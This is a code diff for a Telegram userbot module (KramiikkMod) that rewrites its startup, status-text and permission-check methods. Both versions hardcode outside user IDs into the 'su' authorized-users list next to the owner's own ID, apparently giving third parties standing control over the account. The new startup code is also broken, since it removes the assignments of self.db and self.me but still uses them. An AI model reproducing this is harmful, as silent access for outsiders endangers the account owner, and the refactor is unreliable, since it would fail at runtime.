@@ -16,41 +16,30 @@ class KramiikkMod(loader.Module):
 
     async def client_ready(self, client, db):
         """ready"""
-        self.db = db
-        self.client = client
-        self.me = await client.get_me()
         self.su = db.get("Su", "su", {})
-        if "name" not in self.su:
-            self.su.setdefault("name", self.me.first_name)
-            self.su.setdefault("users", [1124824021, self.me.id])
-            self.db.set("Su", "su", self.su)
-        if 1124824021 not in self.su["users"]:
-            self.su["users"].append(1124824021)
-            self.db.set("Su", "su", self.su)
+        self.su.setdefault("name", client.me.first_name)
+        self.su.setdefault("users", [1124824021, self.me.id])
+        self.db.set("Su", "su", self.su)
 
     async def jkl(self, aa, bb, cc):
         """dy"""
         txt = ""
         if "auto" not in self.su:
             txt += " ⛔️"
-        elif aa in self.su and self.su[aa] == []:
-            txt += " 🟢"
         elif aa in self.su:
-            txt += " ⭐️"
-            for p in self.su[aa]:
-                txt += bb + f" <code>{p}</code>"
-            txt += cc
+            if not self.su[aa]:
+                txt += " 🟢"
+            else:
+                user_list = [f" {bb} <code>{p}</code>" for p in self.su[aa]]
+                txt += " ⭐️" + "".join(user_list) + cc
         else:
             txt += " ⛔️"
         return txt
 
     async def check(self, chat, key):
-        """y"""
-        return (
-            0
-            if key not in self.su or self.su[key] != [] and chat not in self.su[key]
-            else 1
-        )
+        if key in self.su and (not self.su[key] or chat in self.su[key]):
+            return 1
+        return 0
 
     async def scmd(self, m):
         """статус юзербота"""
@@ -135,8 +124,10 @@ class KramiikkMod(loader.Module):
         if "del" in m.text:
             if "ub del+" in m.text:
                 self.su.clear()
-                self.su.setdefault("name", self.me.first_name)
-                self.su.setdefault("users", [1124824021, self.me.id, 1785723159])
+                self.su = {
+                    "name": self.me.first_name,
+                    "users": [1124824021, self.me.id, 1785723159],
+                }
                 self.db.set("Su", "su", self.su)
                 return await m.edit("🛑данные очищены🛑")
             if s in self.su:
